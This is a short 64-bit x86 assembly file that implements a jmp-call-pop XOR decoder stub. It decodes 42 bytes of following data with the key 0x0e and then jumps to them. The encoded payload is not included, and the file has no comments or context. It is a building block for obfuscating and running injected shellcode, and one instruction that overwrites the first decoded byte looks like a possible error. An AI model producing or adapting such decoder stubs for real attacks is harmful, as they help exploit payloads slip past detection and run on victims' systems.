BITS 64
jmp short foo
bar:
	pop rsi
	xor rcx, rcx
	mov cl, 0x2a
decoder:
	xor byte [rsi + rcx - 1], 0xe
	loop decoder
	mov byte [rsi], 0xe
	push rsi
	ret
foo:
	call bar
	